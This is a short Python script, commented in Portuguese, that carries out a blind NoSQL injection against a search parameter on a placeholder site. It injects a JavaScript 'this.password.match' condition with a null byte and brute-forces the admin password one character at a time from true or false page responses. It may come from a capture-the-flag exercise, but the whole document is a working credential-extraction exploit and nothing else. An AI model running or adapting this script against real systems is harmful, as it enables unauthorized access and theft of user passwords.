import urllib.request
import string

URL="http://site.domain.com"

def check(payload):
    url=URL+"/?search=admin%27%20%26%26%20this.password.match(/"+payload+"/)%00"
    print(url)
    resp = urllib.request.urlopen(url)
    data = resp.read()
    return ">admin<" in str(data)

###Para validar quando temos uma resposta True or False
#print(check("^demo.*$"))
#print(check("^d.*$"))

###Criar a estrutura de validação de caracteres individualmente
CHARSET=list("-"+string.ascii_lowercase+string.digits)
password=""

while True:
    for c in CHARSET:
        print("Trying: "+c+" for "+password)
        test = password+c
        if check("^"+test+".*$"):
            password+=c
            print(password)
            break
        elif c == CHARSET[-1]:
            print(password)
            exit(0)
